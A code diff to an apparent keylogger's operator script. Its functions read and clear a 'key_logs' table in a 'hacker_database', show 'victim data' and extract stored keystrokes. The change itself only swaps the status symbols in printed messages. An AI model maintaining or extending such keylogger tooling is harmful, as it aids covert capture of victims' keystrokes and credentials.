@@ -69,8 +69,8 @@ def show_victim_data():
 
 
     except Exception as error:
-        print(colors.Red + '[-]Error occured during the proccess')
-        print('[-]{}'.format(error) + colors.RESET)
+        print(colors.Red + '[✘]Error occured during the proccess')
+        print('[✘]{}'.format(error) + colors.RESET)
 
 
 def read_online_keys():
@@ -103,17 +103,17 @@ def read_online_keys():
             command = "UPDATE `key_logs` SET `keys` = ''"
             my_cursor.execute(command)
 
-            print(colors.Green + '\n[+]Database cleared\n' + colors.RESET)
+            print(colors.Green + '\n[✓]Database cleared\n' + colors.RESET)
 
             hacker_database.commit()
 
         except Exception as e:
-            print(colors.Red + '[-]Error occurred while connecting to the database')
-            print(colors.Red + '[-]' + e + colors.RESET)
+            print(colors.Red + '[✘]Error occurred while connecting to the database')
+            print(colors.Red + '[✘]' + e + colors.RESET)
             exit(0)
 
     except:
-        print(colors.Red + '[-]Error reading credentials' + colors.RESET)
+        print(colors.Red + '[✘]Error reading credentials' + colors.RESET)
         exit(0)
 
 
@@ -124,8 +124,8 @@ def extract_write_data(data_list):
     except:
         pass
 
-    print('\n' + colors.Cyan + '[+]Directory keylogs created')
-    print(colors.Cyan + '[+]Processing data' + colors.RESET, end='')
+    print('\n' + colors.Cyan + '[✓]Directory keylogs created')
+    print(colors.Cyan + '[✓]Processing data' + colors.RESET, end='')
 
     # crete a empty list to append process report
     extract_report = []
@@ -198,7 +198,7 @@ def activate_listener():
             pass
 
         else:
-            print(colors.Red + '[-]Invalid comand' + colors.RESET)
+            print(colors.Red + '[✘]Invalid comand' + colors.RESET)
 
 
 activate_listener()
